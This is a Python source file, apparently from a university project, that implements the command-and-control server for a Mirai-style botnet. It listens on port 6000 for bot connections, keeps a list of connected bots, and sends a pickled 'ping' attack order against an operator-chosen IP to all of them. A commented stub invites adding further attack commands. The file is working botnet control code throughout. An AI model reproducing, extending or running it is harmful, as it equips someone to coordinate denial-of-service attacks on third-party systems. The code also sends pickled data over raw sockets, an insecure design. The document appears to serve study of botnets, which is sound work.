""" This file is the CNC of Mirai Botnet"""

__author__ = "Nemanja Pantic"
__copyright__ = "Copyright 2020, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "nemanja.pantic@heig-vd.ch"

import argparse
import pickle
import socket
import threading
import time
from queue import Queue
import ipaddress
from art import *

NUMBER_OF_THREADS = 3
JOB_NUMBER = [1, 2, 3]
queue = Queue()
all_connections_bot = []
all_bot = []
thread = []

lock = threading.Lock()


# Source https://stackoverflow.com/questions/319279/how-to-validate-ip-address-in-python
def is_valid_ipv4_address(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError as errorCode:
        # uncomment below if you want to display the exception message.
        # print(errorCode)
        # comment below if above is uncommented.
        pass
        return False


def create_socket():
    """Setup the socket for bot.

    :return: no value
    :rtype: None
    """
    try:
        global s
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    """Binding the socket and listening for connections from bot.

    :return: no value
    :rtype: None
    """
    try:
        global host
        global port
        global s
        host = ""
        port = 6000

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def accepting_connections():
    """This method is used to accept every connection send by different bot and store them in a list.

    :return: no value
    :rtype: None
    """
    for c in all_connections_bot:
        c.shutdown(socket.SHUT_RDWR)
        c.close()

    del all_connections_bot[:]
    del all_bot[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout
            all_connections_bot.append(conn)
            all_bot.append(address)
            print("\n" + address[0] + " Bot joined the party")
        except:
            print("Error accepting connections")


def cnc():
    """This method is used to check the command that the administrator put on the prompt and execute the wanted action.

    :return: no value
    :rtype: None
    """
    global thread
    global game_start_first_time
    global timer
    Art = text2art('CNC-Mirai')
    print(Art)
    while True:
        cmd = input(
            '\n\n1) List bot\n2) Ping attack\n\ncnc-mirai> Enter the action of your choice :')

        if cmd == '1':
            print(all_bot)

        elif cmd == '2':
            while True:
                # We check if input is q or a valid IP
                target = input('\nTarget (press q to quit): ')
                # Leave if it's q
                if target == 'q':
                    break
                # Ask for a valid IP
                if is_valid_ipv4_address(str(target)):
                    break
            # Send the request ping to the cards
            m = pickle.dumps(['ping', target])
            send_request_all(m)
        # ADD YOU ATTACK REQUEST HERE
        # elif cmd == '2':
        #    while True:
        # We check if input is q or a valid IP
        # target = input('\nTarget (press q to quit): ')
        # Leave if it's q
        # if target == 'q':
        #    break
        # Ask for a valid IP
        # if is_valid_ipv4_address(str(target)):
        #    break
        # m = pickle.dumps(['fake', target])
        # send_request_all(m)

        else:
            print("Command not recognized")


def send_request_all(cmd):
    """This method is used send a command to all our network

    :param cmd: Represent the command that we want to send to different targets
    :return: no value
    :rtype: None
    """

    for x in range(len(all_connections_bot)):
        conn = all_connections_bot[x]
        conn.send(cmd)


def list_bot():
    """This method is used to periodically check the status of different bot.

    :return: no value
    :rtype: None
    """
    while True:
        results = ''

        for i, conn in enumerate(all_connections_bot):
            try:
                m = pickle.dumps([' '])
                conn.send(m)
            except:
                print("The bot : %s disconnected" % (all_bot[i][0],))
                del all_connections_bot[i]
                del all_bot[i]
                continue
            results += str(i) + "   " + str(all_bot[i][0]) + "   " + str(all_bot[i][1]) + "\n"

        # print("----Players----" + "\n" + results)
        time.sleep(5)


def create_workers():
    """We create thread here and we target the method "work" to start the wanted method.

    :return: no value
    :rtype: None
    """
    global thread
    for i in range(NUMBER_OF_THREADS):
        thread.append(threading.Thread(target=work))
        thread[i].daemon = True
        thread[i].start()


def work():
    """When thread are created we will check the value present in the Queue and launch the wanted method.

    :return: no value
    :rtype: None
    """
    while True:

        x = queue.get()

        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()

        if x == 2:
            cnc()

        if x == 3:
            list_bot()

        # ADD ACTION THAT YOU WANT HERE


def create_jobs():
    """We setup the future action that we gonna do and put them in a Queue.

    :return: no value
    :rtype: None
    """
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


def main():
    """Starting point of application, we get parameters in argv, assign them to the program and start different threads.

    :return: no value
    :rtype: None
    """

    create_workers()
    create_jobs()


main()
